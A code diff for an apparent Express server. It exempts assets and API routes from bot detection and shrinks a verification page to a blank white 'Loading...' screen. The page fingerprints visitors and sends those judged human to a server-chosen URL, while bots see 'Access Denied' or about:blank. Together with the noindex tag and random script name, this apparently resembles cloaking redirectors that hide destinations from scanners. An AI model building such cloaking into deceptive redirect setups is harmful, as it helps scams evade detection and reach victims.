@@ -46,6 +46,11 @@ app.use(express.json({ limit: '10kb' }));
 
 // Advanced bot detection middleware
 app.use((req, res, next) => {
+    // Skip bot detection for JavaScript files and API endpoints
+    if (req.path.endsWith('.js') || req.path.startsWith('/api/') || req.path === '/health') {
+        return next();
+    }
+
     req.botScore = 0;
     req.botSignals = [];
 
@@ -437,87 +442,27 @@ function generateHTML(scriptName) {
         return htmlTemplate.replace(/src="au0cki7gbr\.js"/, `src="${scriptName}"`);
     }
 
-    // Fallback: embedded HTML template (can remove index.html file)
+    // Fallback: embedded HTML template (plain white background)
     return `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Redirecting...</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            height: 100vh; display: flex; justify-content: center; align-items: center;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-        .container { text-align: center; color: white; padding: 2rem; max-width: 500px; }
-        .spinner {
-            width: 60px; height: 60px; border: 5px solid rgba(255,255,255,0.2);
-            border-top: 5px solid white; border-radius: 50%;
-            animation: spin 1s linear infinite; margin: 0 auto 1.5rem;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.75rem; font-weight: 600; margin-bottom: 0.5rem; }
-        .message { margin-top: 1rem; font-size: 1rem; opacity: 0.9; }
-        .progress { width: 100%; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin-top: 1.5rem; }
-        .progress-bar { height: 100%; background: white; width: 0%; animation: progress 3s ease-in-out forwards; }
-        @keyframes progress { 100% { width: 100%; } }
-        #error { display: none; margin-top: 1.5rem; padding: 1rem; background: rgba(255,59,48,0.2); border-radius: 8px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h1>Redirecting...</h1>
-        <p class="message">Please wait while we verify your connection</p>
-        <div class="progress"><div class="progress-bar"></div></div>
-        <div id="error"></div>
-    </div>
-    <script src="${scriptName}"></script>
-    <script>
-        (async function() {
-            const detector = new AdvancedBotDetector({ behaviorTimeout: 3000, threshold: 80 });
-            const result = await detector.detect();
-
-            const urlParams = {
-                path: window.location.pathname !== '/' ? window.location.pathname : null,
-                query: window.location.search || null
-            };
-
-            const response = await fetch('/api/verify-human', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    fingerprint: result.fingerprint,
-                    behaviors: result.behaviors,
-                    clientScore: result.score,
-                    checks: result.checks,
-                    urlParams: urlParams
-                })
-            });
-
-            const serverResult = await response.json();
-
-            if (serverResult.allowed && serverResult.redirectUrl) {
-                setTimeout(() => window.location.href = serverResult.redirectUrl, 2000);
-            } else {
-                document.querySelector('.spinner').style.display = 'none';
-                document.querySelector('h1').textContent = 'Access Denied';
-                document.querySelector('.message').textContent = 'Unable to verify your browser';
-                document.getElementById('error').style.display = 'block';
-                document.getElementById('error').textContent = 'Your request appears automated.';
-            }
-        })();
-    </script>
-    <noscript>
-        <meta http-equiv="refresh" content="0;url=about:blank">
-        <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;">
-            <h1>JavaScript Required</h1>
-        </div>
-    </noscript>
-</body>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow"><title>Loading...</title></head>
+<body style="margin:0;background:#fff"></body>
+<script src="${scriptName}"></script>
+<script>
+(async function(){
+try{
+const d=new AdvancedBotDetector({behaviorTimeout:3000,threshold:80});
+const r=await d.detect();
+const u={path:window.location.pathname!=='/'?window.location.pathname:null,query:window.location.search||null};
+const res=await fetch('/api/verify-human',{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({fingerprint:r.fingerprint,behaviors:r.behaviors,clientScore:r.score,checks:r.checks,urlParams:u})});
+const s=await res.json();
+if(s.allowed&&s.redirectUrl){window.location.href=s.redirectUrl;}
+else{document.body.innerHTML='<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-family:sans-serif;color:#333">Access Denied</div>';}
+}catch(e){console.error(e);}
+})();
+</script>
+<noscript><meta http-equiv="refresh" content="0;url=about:blank"></noscript>
 </html>`;
 }
 
